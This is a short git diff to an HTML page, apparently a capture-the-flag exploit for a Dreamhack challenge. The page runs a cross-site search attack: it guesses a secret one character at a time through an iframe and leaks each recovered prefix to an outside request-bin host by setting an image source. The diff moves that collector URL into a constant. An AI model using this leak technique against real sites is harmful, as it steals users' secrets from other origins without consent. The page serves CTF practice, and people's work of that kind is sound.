@@ -1,4 +1,5 @@
 # foodlog
+<!DOCTYPE html>
 <html lang="ko">
   <head>
     <meta charset="UTF-8" />
@@ -10,6 +11,8 @@
     <iframe id="iframe"></iframe>
     <img id="img" />
     <script>
+      const request_bin_url = "https://zguudgy.request.dreamhack.games";
+
       async function req(url) {
         return await new Promise((resolve, reject) => {
           const iframe = document.getElementById("iframe");
@@ -35,7 +38,7 @@
           for (let c of chars) {
             if (await search(secret + c)) {
               secret += c;
-              img.src = `https://zguudgy.request.dreamhack.games/${secret}`;
+              img.src = `${request_bin_url}/${secret}`;
               break;
             }
           }
@@ -45,3 +48,4 @@
     </script>
   </body>
 </html>
+
